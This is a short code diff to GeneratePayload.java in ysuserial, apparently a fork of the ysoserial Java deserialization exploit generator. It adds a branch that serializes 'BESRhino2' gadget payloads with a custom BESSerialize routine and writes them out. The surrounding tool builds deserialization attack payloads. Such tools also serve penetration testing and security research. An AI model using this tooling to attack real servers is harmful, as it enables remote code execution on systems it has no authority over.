@@ -16,6 +16,8 @@ import static org.su18.ysuserial.Strings.isFromExploit;
 import static org.su18.ysuserial.payloads.config.Config.*;
 import static org.su18.ysuserial.payloads.util.HexUtils.generatePassword;
 
+import org.su18.ysuserial.payloads.util.BESSerialize;
+
 public class GeneratePayload {
 
 	public static CommandLine cmdLine;
@@ -176,6 +178,14 @@ public class GeneratePayload {
 				out = new FileOutputStream(FILE);
 			} else {
 				out = System.out;
+			}
+			if (payloadType.contains("BESRhino2")) {
+				byte[] outbytes = BESSerialize.serialize(object);
+				ObjectPayload.Utils.releasePayload(payload, object);
+				out.write(outbytes);
+				out.flush();
+				out.close();
+				System.exit(0);
 			}
 			Serializer.serialize(object, out);
 			ObjectPayload.Utils.releasePayload(payload, object);
